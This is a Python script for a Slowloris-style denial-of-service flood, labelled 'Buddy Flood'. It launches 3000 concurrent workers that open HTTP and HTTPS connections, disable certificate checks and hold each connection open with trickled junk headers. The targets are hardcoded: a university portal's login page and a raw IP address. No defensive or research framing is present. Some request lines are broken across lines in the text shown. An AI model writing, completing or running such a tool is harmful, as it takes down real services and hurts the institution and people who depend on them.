import asyncio
import random
import time
import socket
import ssl

try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

TARGETS = [
    {"host": "myportal.fudutsinma.edu.ng", "port": 443, "ssl": True, "path": "/auth/login"},
    {"host": "102.91.68.102", "port": 80, "ssl": False, "path": "/"},
    {"host": "102.91.68.102", "port": 443, "ssl": True, "path": "/"},
]

async def worker(target, stats):
    while True:
        try:
            if target['ssl']:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.open_connection(target['host'], target['port'], ssl=context)
            else:
                reader, writer = await asyncio.open_connection(target['host'], target['port'])
            
            stats['active_conns'] += 1
            stats['total_hits'] += 1
            
            # Send initial request
            writer.write(f"GET {target['path']}?{random.randint(0, 999999)} HTTP/1.1
".encode())
            writer.write(f"Host: {target['host']}
".encode())
            writer.write(f"User-Agent: {random.choice(USER_AGENTS)}
".encode())
            writer.write(b"Connection: keep-alive

")
            await writer.drain()

            # Keep connection alive (Slowloris mode)
            while True:
                await asyncio.sleep(random.uniform(5, 15))
                writer.write(f"X-Keep-Alive: {random.randint(1, 9999)}
".encode())
                await writer.drain()
                stats['total_hits'] += 1
                
        except:
            stats['errors'] += 1
        finally:
            if 'writer' in locals():
                try:
                    stats['active_conns'] -= 1
                    writer.close()
                except: pass

async def monitor(stats):
    start_time = time.time()
    while True:
        elapsed = time.time() - start_time
        if elapsed > 0:
            cps = stats['total_hits'] / elapsed
            print(f"[BUDDY FLOOD] Active: {stats['active_conns']} | Hits: {stats['total_hits']} | CPS: {cps:.2f} | Errors: {stats['errors']}", flush=True)
        await asyncio.sleep(2)

async def main():
    concurrency = 3000
    stats = {'active_conns': 0, 'total_hits': 0, 'errors': 0}
    
    print(f"[INFO] Launching HARDCODED Buddy Flood (3000 workers)")
    
    tasks = []
    for _ in range(concurrency):
        target = random.choice(TARGETS)
        tasks.append(asyncio.create_task(worker(target, stats)))
    
    tasks.append(asyncio.create_task(monitor(stats)))
    await asyncio.gather(*tasks)

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass
